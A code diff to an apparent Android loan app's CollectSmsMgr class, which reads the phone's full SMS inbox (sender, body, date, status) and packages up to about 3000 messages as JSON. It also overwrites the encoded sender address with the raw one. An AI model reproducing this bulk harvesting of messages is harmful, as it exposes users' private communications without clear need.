@@ -12,7 +12,6 @@ import com.tiny.cash.loan.card.Constant
 import com.tiny.cash.loan.card.collect.EncodeUtils
 import com.tiny.cash.loan.card.kudicredit.BuildConfig
 import com.tiny.cash.loan.card.log.LogSaver
-import com.tiny.cash.loan.card.ui.bean.SmsInfo
 import java.util.regex.Pattern
 
 class CollectSmsMgr {
@@ -92,8 +91,8 @@ class CollectSmsMgr {
         return GsonUtils.toJson(readSms(false))
     }
 
-    private fun readSms(tryCache : Boolean): ArrayList<SmsInfo>? {
-        val list: ArrayList<SmsInfo> = ArrayList<SmsInfo>()
+    private fun readSms(tryCache : Boolean): ArrayList<SmsRequest>? {
+        val list: ArrayList<SmsRequest> = ArrayList<SmsRequest>()
         val uri = Uri.parse("content://sms/")
         val projection =
             arrayOf("_id", "address", "person", "body", "date", "type", "status", "read")
@@ -114,13 +113,13 @@ class CollectSmsMgr {
                     val type = cursor.getInt(5)
                     val status = cursor.getInt(6)
                     val read = cursor.getInt(7)
-                    val smsRequest = SmsInfo()
+                    val smsRequest = SmsRequest()
                     smsRequest.addr = BaseCollectDataMgr.encodeData(address)
                     smsRequest.body = BaseCollectDataMgr.encodeData1(processUtil(body))
-                    smsRequest.time = date.toString()
-                    smsRequest.type = type.toString()
-                    smsRequest.status = status.toString()
-                    smsRequest.read = read.toString()
+                    smsRequest.time = date
+                    smsRequest.type = type
+                    smsRequest.status = status
+                    smsRequest.read = read
                     smsRequest.addr = address
                     if (list.size <= 3000 || !hasFailure) {
                         list.add(smsRequest)
